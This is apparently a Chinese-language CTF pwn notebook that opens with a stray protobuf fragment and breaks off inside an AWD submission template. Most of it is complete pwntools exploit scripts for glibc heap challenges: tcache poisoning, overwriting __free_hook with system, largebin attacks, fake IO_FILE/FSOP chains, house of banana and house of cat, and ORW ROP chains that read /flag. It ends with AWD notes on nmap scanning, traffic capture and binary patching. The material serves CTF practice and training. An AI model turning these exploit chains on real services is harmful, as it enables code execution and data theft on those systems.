if _descriptor._USE_C_DESCRIPTORS == False:

  DESCRIPTOR._options = None
  _globals['_PWN']._serialized_start=18
  _globals['_PWN']._serialized_end=59
# @@protoc_insertion_point(module_scope)




```





## 经验与判断

scanf读入堆块 == 堆溢出

计算器题目

通常用栈作为计算的位置，即存放计算的过程信息，+-符号等

输出结果的地方用数组引索数组越界 == 泄露libc





## 堆风水艺术

如果edit和show的是同一个堆块->可被用来伪造的位置 ？

show能输出堆块内容->输出unsortbin尚存的libc地址 **常规**

malloc_size无限制->能申请到一个libc地址

free未置空(UAF)

溢出编辑(UAF)

任意libc地址写值(无要求)->IO_list_all/global_max_fast

下标越界->数组下标不能为int和char类型！

​             ->正向越界，edit越界导致可以修改下一个size(输入后缺少边界校验)

嵌套结构->show外层“姓名”，“姓名”连接到堆块地址

​             ->直接执行地址->调用printf_got表覆写

在调用 pool_alloc 函数时使用 32 位数值 + 1 拓展成 64 位的方法，这里存在整数溢出

将堆溢出转换成 ROP，控制寄存器栈迁移



首先要对功能足够**熟悉**，需要时间，**触发漏洞点**，泄露地址

怎么熟悉，改变量名，边熟边找，触发漏洞点是关键中的关键

往往就能实现泄露，**结合结果和漏洞点**



泄露libc以后一道题就完成了百分之60

剩下部分往往就是重复一遍泄露的打法，比如tcacha poison





要对glibc的**堆管理机制**的漏洞点足够熟悉

double free 的不同版本

malloc_consolidate

offbyone and offfbynull   其中伪造的布局，**不同版本又是如何check**

house of botake

**常见的check**



触发漏洞点后要延展，漏洞延展，达到目的



切割unsortbin，UAF，要去想，怎么才能实现我们的目的，目的导向



常见的目的



构造一个unsortbin和tcachebin或者fastbin的同指针，修改一个完成对另一个的操作



放置进unsortbin，操作的空间就变多了，house of botake



tcache比fastbin好申请，tcache只有7个，unsortBin有很多个



堆叠的概念，上下合并本质上是大包小的问题，也存在小表大的情况，2个一样的指针指向2个堆这叫堆叠



一个完整的exp是水到渠成的



关于堆分水，很多人说的double free UAF unlink tcacha poison



不同size的堆块，想到切割，想到堆叠





常规的doublefree

tcache的doublefree主要由bk控制

fastbin主要通过相应sizebin的头节点堆块来检验







00的形式，fastbin不支持，tcache

010的形式，fastbin是支持的，tcache一直都不支持









 

打断点的意义

1.看寄存器的取值变化

2.看函数的实际传参

### realloc_hook 调整栈帧

劫持malloc为

```python
malloc_hook = libc_base + libc.sym['__malloc_hook']
realloc = libc_base + libc.sym['realloc']
realloc_hook = libc_base + libc.sym['__realloc_hook']
one = libc_base + 0x4527a


edit(1,0x10,p64(malloc_hook-0x23))
add(0x68,'a')# 3
add(0x68,'a'*0xb+p64(one)+p64(realloc+xxx))# 手动调整
```



### 0xff内size UAF

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

for i in range(8):
    add(i, 0x90)# 0-7

add(8, 0x20)

for i in range(8):
    dele(i)

show(0)
key = u64(p.recv(5).ljust(8,'\x00'))
lg('key')
heap_base = key<<12
lg('heap_base')

edit(7, 'a')# main_arena低地址为\x00
show(7)
libc_base = l64() - 0x1e3c61
lg('libc_base')
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
edit(7, '\x00')

#--------------------改fd----------------------
add(9, 0x20)
add(10, 0x20)# 放binsh
edit(10, "/bin/sh\x00")

dele(8)
dele(9)

edit(9, p64(free_hook ^ key))
add(11, 0x20)
add(12, 0x20)
edit(12, p64(system_addr))

dele(10)
ia()
```



### 输出点

**%s     指针或者数组(能去引索)**

%d     不够地址长度的数(不能引索)

### 输入点/修改点

布局的关键

修改本质就是一种链式引索

```c
buf[read(0, buf, 0x100uLL)] = 0; //offbynull
```



```c
__int64 __fastcall sub_9F5(_BYTE *a1, int a2)
{
  int i; // [rsp+14h] [rbp-Ch]

  if ( a2 <= 0 )
    return 0LL;
  for ( i = 0; ; ++i )
  {
    if ( read(0, a1, 1uLL) != 1 )
      return 1LL;
    if ( *a1 == '\n' )
      break;
    ++a1;
    if ( i == a2 )
      break;
  }
  *a1 = 0;                                      // offbynull
  return 0LL;
}
```





## IO利用

### Linkmap程序基地址

劫持Linkmap链表中存放的程序基地址为one_gadget地址-0x3d70(fini_array_addr)，导致触发fini_array时触发one_gadget

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
# p = process('./ld-2.33.so ./TinyNote'.split(),env={'LD_PRELOAD':'./libc-2.33.so'})
p = process("./manageheap")
elf = ELF("./manageheap")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
# context.terminal = ['cmd.exe', '/c', 'wt.exe', '-w', '0','--title', 'gdb', 'bash', '-c']
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,name,id_con='a'):
    sla("Your Choice:",1)
    sla("please input your major's number:",size)
    p.sendafter("please input your name:",name)
    sa("> \n",id_con)

def show(idx):
    sla("Your Choice:",3)
    sla("input your idx:",idx)

def edit(idx,id_con,new_con):
    sla("Your Choice:",4)
    sla("input your idx:",idx)
    sa("please input your id:",id_con)
    s(new_con)

def dele(idx):
    sla("Your Choice:",2)
    sla("input your idx:",idx)

# 拿地址
heap_base = uu64()-0x2d0
lg('heap_base')
key = heap_base>>12
lg('key')
libc_base = l64()-0x219c61-0x500
lg('libc_base')
link_map = libc_base + 0x2652e0# 
lg("link_map")
one = libc_base + 0xebcf1

edit(1,p64((heap_base+0xc20)^key),p64(link_map^key))
add(0x49,'a'*0x10)# 5
add(0x49,p64(one)'放one',p64(heap_base+0x740-0x3D70))# 6

# exit

ia()
```

### mp_.tcache_bins

漏洞点：mp_.tcache_bins可被写为一个大值

```python
add(size)# 这里size要>0x430
# 布置位：heap_base + (size>>4 *8)+0x88

add(0, 0x528)
add(1, 0x600)
add(2, 0x518)

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1e4030
main_arena = libc_base+0x1e4030
lg('libc_base')
mp_ = libc_base + 0x1e3280 # p &mp_
free_hook = libc_base + libc.sym["__free_hook"]
system_addr = libc_base + libc.sym["system"]
lg('mp_')

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
pay = p64(main_arena)*2 + p64(0) + p64(mp_+0x50-0x20)
edit(0,pay)
add(3,0x900)
# -------------------------------------------------------------------
# ---Largebinattack后

dele(1)# 0x600
edit(0,"a"*0xe8 + p64(free_hook))

add(1,0x600)
edit(1, p64(system_addr))
edit(0, "/bin/sh\x00")
dele(0)
ia()
```



![image-20220409223332707](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220409223332707.png)

![image-20220403180012397](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220403180012397.png)

`0x0000564ce2ed6000+0x90`

### global_fast

漏洞点：global_fast可被写为一个大值

在可以申请0xffff类大堆的情况下(**任意地址写任意值**，任意值要求能UAF)

```python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./heap2019")
elf = ELF("./heap2019")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','60']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(size,con='a'):
    sla("4.exit",1)
    sla("Content length:",size)
    p.sendafter("Content:",con)

def edit(con):
    sla("4.exit",2)
    p.sendafter("Comment:",con)

def dele(idx):
    sla("4.exit",3)
    sla("Content id:",idx)

# 漏洞点是任意地址写deadbeef
sla("4.exit",2019)
p.recvuntil("0x")
base = int(p.recv(12),16)-0x202040
lg('base')

add(0x410,'a')# 0
add(0x400,'a')# 1
add(0x420,'a')# 2
add(0x408,'a'*0x400+'/bin/sh\x00')# 3 伪造IO

dele(0)
dele(2)
add(0x2333,'a')# 0
add(0x420,'a')# 2
ru("Data is:\n")
heap_base = uu64()-0x61
lg('heap_base')

add(0x410,'a')# 4
ru("Data is:\n")
libc_base = l64()-0x3c4f00-0x61
lg('libc_base')
system = libc_base + libc.sym['system']
IO_list_all = libc_base + 0x3c5520
lg('IO_list_all')
global_max_fast = libc_base + 0x3c67f8
# ---------------------------------------------
# p &main_arena.fastbinsY
# p &global_max_fast
add(size) 
# delta = IO_list_all/free_hook - main_arena.fastbinsY_addr
# size = (delta * 2) + 0x10
pay = IO_FILE
edit(chunk,pay)
# 一段攻击
dele(chunk) # 写入堆地址
# 二段攻击,利用UAF
# edit(chunk,p64(system))
# add(chunk)//写入system


dele(0)
vtable = heap_base + 0x001150
pay = p64(0)*2
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)
add(0x1400,pay)# 0

edit('a'*0x20+p64(global_max_fast))
dele(0)# IO_list_all写入堆地址

sla("4.exit", '4')
ia()
```



### 2.23 FSOP

```python
system = libc_base + libc.sym['system']

vtable = heap_base + 0x001150
# pay = '/bin/sh\x00'+p64(size)
pay += p64(0)*2 # 可被修改
pay += p64(0) + p64(1)
pay = pay.ljust(0xC0,'\x00')
pay += p64(0)+p64(vtable)
# vtable
pay += p64(0)*3
pay += p64(system)# one_gadget
```

### 2.23 house of orange



![image-20220507104532095](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220507104532095.png)

### 2.27 FSOP

```python
def FILE(binsh,system,IO_str_jumps):
	fake_IO_FILE  = p64(0xfbad1800) + p64(0)*3
	fake_IO_FILE += p64(0) + p64(0xffffffffffffffff) # fp->_IO_write_ptr > fp->_IO_write_base; pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)
	fake_IO_FILE += p64(0)*2 + p64((binsh-100)//2)
	fake_IO_FILE = fake_IO_FILE.ljust(0xC0,'\x00')
	fake_IO_FILE += p64(0) + p64(0)*2	# _mode <= 0
	fake_IO_FILE += p64(IO_str_jumps)
	fake_IO_FILE += p64(system) # 0xe0 
	return fake_IO_FILE

```

### 2.36 FSOP/CAT

只需修改**fake_io_addr**地址，**_IO_save_end**为想要调用的函数，**_IO_backup_base**为执行函数时的rdx，以及修改_flags为执行函数时的rdi;

![图片描述](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/959842_JDJKTRK7GJUEUFR.png)

```python
setcontext = libc_base + libc.sym['setcontext'] + 61
IO_wfile_jumps = libc_base + 0x1f30a0
one_gadget = libc_base + 0x105fb7

heap_base = libc_base-0x034000 # heap_base
fake_io_addr = heap_base+0x10 # IO_list_all放的地址

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*2
fake_IO_FILE += p64(0)+p64(0xffffffffffffffff)
fake_IO_FILE += p64(0)+p64(0)
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(one_gadget) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) 
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x30)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

sl(fake_IO_FILE)
# sl(fake_IO_FILE[0x10:])

```



### house of banana

```c
exit-> __run_exit_handlers->_dl_fini->_dl_fini+520(setcontext)
```



```python
# UAF
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("week-4.hgame.lwsec.cn","31435")
p = process("./vuln")
elf = ELF("./vuln")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def add(idx,size):
    sla(">",1)
    sla("Index: ",idx)
    sla("Size: ",size)

def edit(idx,con):
    sla(">",3)
    sla("Index: ",idx)
    p.sendafter("Content: ",con)

def show(idx):
    sla(">",4)
    sla("Index: ",idx)

def dele(idx):
    sla(">",2)
    sla("Index: ",idx)

add(0,0x520)# big
add(1,0x508)
add(2,0x508)# small IO_FILE

dele(0)
add(3,0x900)
show(0)
libc_base = l64()-0x1f70f0
main_arena = libc_base + 0x1f70f0
lg('libc_base')
rtld_global = libc_base+0x23d020
lg('rtld_global')
setcontext = libc_base + libc.sym['setcontext'] + 61
ret = libc_base + libc.sym['setcontext'] + 0x14E
lg('ret')
pop_rdi = libc_base + 0x0000000000023ba5

pop_rsi = libc_base + 0x00000000000251fe
pop_rdx = libc_base + 0x000000000008bbb9 # pop_2
Open=libc_base+libc.sym['open']
Read=libc_base+libc.sym['read']
Write=libc_base+libc.sym['write']
# bin_sh = libc_base + libc.search('/bin/sh\x00').next()
# system =  libc_base + libc.sym['system']
# lg("system")

edit(0,'a'*0x10)
show(0)
ru("a"*0x10)
heap_base = uu64()-0x290
lg('heap_base')
key = heap_base>>12
lg('key')

edit(0,p64(main_arena)*2)
dele(2)
edit(0,p64(main_arena)*2 + p64(0) + p64(rtld_global-0x20))
add(3,0x900)
# -------------------------------------------------------------------

fake_heap_addr = heap_base+0xcd0 # rtld_global填的堆地址
flag_addr = fake_heap_addr+0xb8 # 相对偏移
next_load = libc_base + 0x23e8b0 # 第一个load+0x18的值

orw =  p64(pop_rsi)+p64(0)+p64(Open)
orw += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(heap_base+0x1b00)+p64(pop_rdx)+p64(0x50)+p64(0)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)+"/flag".ljust(8,'\x00')

payload = p64(0) + p64(next_load) + p64(0) + p64(fake_heap_addr)
payload += p64(setcontext) + p64(ret) # rdx_addr/call rdx

payload += p64(flag_addr) # rsp
payload += orw # 0x78
payload = payload.ljust(0xc8,'\x00')
# payload += p64(bin_sh)# rsp
# payload += p64(0)
# payload += p64(system)
# payload += '\x00'*0x80

payload += p64(fake_heap_addr + 0x28 + 0x18) # rdx+0xa0
payload += p64(pop_rdi) # rdx+0xa8
payload = payload.ljust(0x100,'\x00')
payload += p64(fake_heap_addr + 0x10 + 0x110)*0x3
payload += p64(0x10)
payload = payload.ljust(0x334 - 0x10,'\x00')# 2.36
payload += '\x10'
# payload = payload.ljust(0x31C - 0x10,'\x00')
# payload += '\x08'

edit(2,payload)
edit(1,'a'*0x500+p64(fake_heap_addr + 0x20))

sla(">",5)
ia()
```

### house of cat 

```c
__malloc_assert->__fxprintf->locked_vfxprintf->__vfprintf_interna->__vfprintf_internal
->_IO_wfile_seekoff->_IO_switch_to_wget_mode(_IO_WOVERFLOW)
```





````python
# _*_ coding:utf-8 _*_
from pwn import *
import re
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# p = remote("","")
p = process("./house_of_cat")
elf = ELF("./house_of_cat")
libc = elf.libc

context.log_level = "debug" # info
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-hp','64']


def dbg(breakpoint=''):
    elf_base = int(os.popen('pmap {}| awk \x27{{print \x241}}\x27'.format(p.pid)).readlines()[1], 16) if elf.pie else 0
    script = 'b *{:#x}\n'.format(int(breakpoint) + elf_base) if isinstance(breakpoint, int) else breakpoint
    gdb.attach(p,script)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
ia      = lambda                    :p.interactive()
hs256   = lambda data               :sha256(str(data).encode()).hexdigest()
l32     = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
l64     = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
uu32    = lambda                    :u32(p.recv(4).ljust(4,'\x00'))
uu64    = lambda                    :u64(p.recv(6).ljust(8,'\x00'))
int16   = lambda data               :int(data,16)
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))
# sc      = lambda                    :shellcraft.amd64.linux.sh()
#-----------------------------------------------------------------------------------------

def login():
    sa("mew mew mew~~~~~~",'LOGIN | r00t QWB QWXFadmin')

def game():
    sa("mew mew mew~~~~~~",'CAT | r00t QWB QWXF'+'\xff'+'$')

def add(idx,size,con='a'):
    game()
    sla("plz input your cat choice:",1)
    sla("plz input your cat idx:",idx)
    sla("plz input your cat size:",size)
    p.sendafter("plz input your content:",con)

def dele(idx):
    game()
    sla("plz input your cat choice:",2)
    sla("plz input your cat idx:",idx)

def show(idx):
    game()
    sla("plz input your cat choice:",3)
    sla("plz input your cat idx:",idx)

def edit(idx,con):
    game()
    sla("plz input your cat choice:",4)
    sla("plz input your cat idx:",idx)
    p.sendafter("plz input your content:",con)


login()
add(0,0x420)
add(1,0x418)
add(2,0x418)

dele(0)
add(3,0x430)
show(0)
libc_base = l64()-0x21A0D0
lg('libc_base')
main_arena = libc_base+0x21A0D0
p.recv(10)
heap_base=u64(p.recv(6).ljust(8,'\x00'))-0x290
lg('heap_base')
#---------------------------------------------------------
setcontext = libc_base + libc.sym['setcontext'] + 61 
# Close = libc_base + libc.sym['close']
# Open = libc_base + libc.sym["open"]
Read = libc_base + libc.sym["read"]
Write = libc_base + libc.sym['write']
stderr = libc_base + libc.sym['stderr'] # *
IO_wfile_jumps = libc_base + 0x2160c0 # *
lg('IO_wfile_jumps')
pop_rdi = libc_base + 0x000000000002a3e5
pop_rsi = libc_base + 0x000000000002be51
pop_rdx_rbx = libc_base + 0x0000000000090529 
pop_rax = libc_base + 0x0000000000045eb0
syscall = libc_base + 0x0000000000091396
ret= libc_base + 0x0000000000029cd6


orw_addr = heap_base+0x17b0
fake_io_addr = heap_base+0xae0  # 伪造的fake_IO结构体的地址
flag = fake_io_addr+0x160

next_chain = 0
fake_IO_FILE  = p64(0xfbad1800) + p64(0) # _flag = '/bin/sh'/rdi
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(1)+p64(2)
fake_IO_FILE += p64(fake_io_addr+0xb0) # _IO_backup_base = setcontext_rdx/rdx
fake_IO_FILE += p64(setcontext) # _IO_save_end = call addr(call setcontext)
fake_IO_FILE =  fake_IO_FILE.ljust(0x68, '\x00')
fake_IO_FILE += p64(0) # _chain
fake_IO_FILE =  fake_IO_FILE.ljust(0x88, '\x00')
fake_IO_FILE += p64(heap_base) # _lock = a writable address
fake_IO_FILE =  fake_IO_FILE.ljust(0xa0, '\x00')
fake_IO_FILE += p64(fake_io_addr+0x30) #_wide_data,rax1_addr
fake_IO_FILE =  fake_IO_FILE.ljust(0xc0, '\x00')
fake_IO_FILE += p64(1) # _mode = 1
fake_IO_FILE =  fake_IO_FILE.ljust(0xd8, '\x00')
fake_IO_FILE += p64(IO_wfile_jumps+0x10)  # vtable
fake_IO_FILE += p64(0)*6
fake_IO_FILE += p64(fake_io_addr+0x40)  # rax2_addr

fake_IO_FILE =  fake_IO_FILE.ljust(0x150,'\x00')
fake_IO_FILE += p64(orw_addr)+p64(ret)# fake_io_addr+0xb0+0xa0/0xa8
fake_IO_FILE += '/flag'.ljust(0x10, '\x00')

dele(2)# 因为题目只能edit 0x30/所以要重新申请
add(5,0x418,fake_IO_FILE[0x10:])

dele(2)
edit(0,p64(main_arena)*2+p64(0)+p64(stderr-0x20))
add(4,0x450)
#----------------------------------------------
# orw =  p64(pop_rdi)+p64(0)+p64(Close)# 限制了read的fd为0
# orw += p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(Open)
orw += p64(pop_rax)+p64(2)+p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(0)+p64(syscall)
orw += p64(pop_rdi)+p64(0)+p64(pop_rsi)+p64(fake_io_addr+0x200)+p64(pop_rdx_rbx)+p64(0x30)+p64(0)+p64(Read)
orw += p64(pop_rdi)+p64(1)+p64(Write)
add(6,0x450,orw)

# Largebinattack改topchunk位为小值
add(7,0x440)
add(8,0x430)
add(9,0x430)
dele(7)
add(10,0x450)
dele(9)
edit(7,p64(libc_base+0x21a0e0)*2+p64(0)+p64(heap_base+0x2d30+3-0x20))
game()
sla("plz input your cat choice:",1)
sla("plz input your cat idx:",15)
sla("plz input your cat size:",0x468)# Largebinattack 和 __malloc_assert

p.interactive()
````



## musl

```bash
sudo cp ./libc.so /lib/ld-musl-x86_64.so.1
```



## AWD&AWDP

扫存活

```shell
nmap -sn 192.168.3.1/24
nmap -sT --min-rate 10000 -p- 192.168.3.122
```

tcpdump抓取流量包

```shell
tcpdump -i lo host 192.168.1.123 and port 9999 -w /tmp/xxx.pcap
```

然后wireshark分析，选择包->原始数据

```python
payload = '''
'''
payload = payload.split("\n")
print(payload)
for x in payload:
	p.send(unhex(x))
```

### 审查点

scanf+堆 == 堆溢出

UAF，程序只置空了指针而没有置空 size，或者相反

### patch

改eh_frame：

在.eh_frame添加函数功能

选中目标段，全部nop，edit->function->create function

替换掉原始指令



增加eh_frame段执行权限，修改开头eh_frame的pht，Flags字段

![image-20231017194109359](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231017194109359.png)

UAF   

**1.nop free_plt**

2.uaf_patch

在eh_frame段写这些内容，原free函数jump过来即可

```
call    _free
mov     qword ptr [202050h], 0
jmp     loc_C0A
```



循环while

只需要把变量变为常量0/1



printf()格式化字符串

修改寄存器赋值，不改动printf以及eh_frame
rdi<- %s
rsi <- 地址

加%s参数。在`.eh_frame`段中填入%s字符串，假设地址为0x400c01，将`mov edi, offset format`，修改为`mov edi offset 0x400c01, mov rsi offset format`。



数组越界

添加判断语句

比如，在eh_frame段写这些内容，jmp过来

```
.eh_frame:00000000004012C8 83 BD E8 FB FF FF 63          cmp     dword ptr [rbp-418h], 63h ; 'c'
.eh_frame:00000000004012CF 0F 87 25 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012CF
.eh_frame:00000000004012D5 83 BD EC FB FF FF 15          cmp     dword ptr [rbp-414h], 15h
.eh_frame:00000000004012DC 0F 87 18 F9 FF FF             ja      loc_400BFA
.eh_frame:00000000004012DC
.eh_frame:00000000004012E2 48 8D 3D 2F FA FF FF          lea     rdi, aPleaseInputWas            ; "PLEASE INPUT wasd TO MOVE YOURSELF!"
.eh_frame:00000000004012E9 E9 0C F6 FF FF                jmp     loc_4008FA
```



如果本来有沙盒，prctl->nop，再进行加沙箱的操作



命令执行修复 破坏字符串，比如flag这样的字符串

update.sh

```shell
#!/bin/sh
# update.sh
cp pwn /home/ctf/pwn
cp libc.so.6 /lib/x86_64-linux-gnu/libc.so.6
cp ld-xx.so/lib64/ld-linux-x86-64.so.2
chmod 777 /home/ctf/pwn

tar -zcvf 1.tar.gz ./xxx ./update.sh
```



### 参考资料

https://ohmygodlin.github.io/ctf/awd/2020/11/20/AWD-pwn%E5%A4%87%E5%BF%98/



```
llvm混淆0x23aaa 0x28
```





### Fix-tips

- nop free/syscall（UserManager、tmpfs、pwn_vvvvmmmm）
- mmap 7 改为 3（oldvm、cgi）
- 缩小 size（SafeParse、mvvm）



### pwn_waf

```bash
mkdir /tmp/.waf         # 创建一个目录，注意要和编译时的配置文件一致。
chmod 777 /tmp/.waf     # 修改对应的权限
cp /tmp/hosts.txt /tmp/.waf/hosts.txt  # 将多目标防护的对象文件放到正确位置

cp /path/pwn /tmp/.waf       # 将要防护的pwn文件，复制到对应的目录
cp /tmp/catch /path/pwn      # 用catch 或者 i0gan 、 forward 替换原始的pwn文件
chmod 777 /path/pwn
chmod 777 /tmp/.waf/pwn
```

### sandbox

```bash
evilPatcher file [enter]
evilPatcher file /pach/sandboxfile
```

### 提交模板

```python
# _*_ coding:utf-8 _*_
from pwn import *
import os, struct, random, time, sys, signal
import hashlib
from hashlib import sha256

# context.log_level = "debug"
context.arch = "amd64"

context.terminal = ['tmux', 'splitw', '-h']

ip = server_ip = sys.argv[1].split(':')[0]
